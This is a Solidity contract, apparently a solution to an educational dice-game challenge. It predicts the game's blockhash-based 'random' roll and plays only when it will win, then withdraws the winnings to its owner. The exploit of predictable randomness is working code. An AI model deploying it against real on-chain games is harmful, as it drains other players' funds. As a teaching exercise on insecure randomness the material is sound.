pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
        console.log(diceGameAddress);
        console.log(address(diceGame));
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _to) public onlyOwner {
      payable(_to).transfer(address(this).balance);
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        // while (True){

        // }
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        // console.log("Roll");
        // console.log(roll);
        
        // console.log("block.number");
        // console.log(block.number);

        // console.log("address");
        // console.log(address(diceGame));


        // console.log("diceGame.nonce");
        // console.log(diceGame.nonce());

        // diceGame.rollTheDice{value: .002 ether}();
        if (roll <= 2 && address(this).balance >= .002 ether) {
            console.log("called!!");
            // diceGame.rollTheDice{value: address(this).balance}();
            diceGame.rollTheDice{value: .002 ether}();
        }
        else {
            revert();
        }
        
    }

    //Add receive() function so contract can receive Eth
    event Received(address, uint);
    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
    event Fallback(address, uint);
    fallback() external payable {
        emit Fallback(msg.sender, msg.value);
    }
}
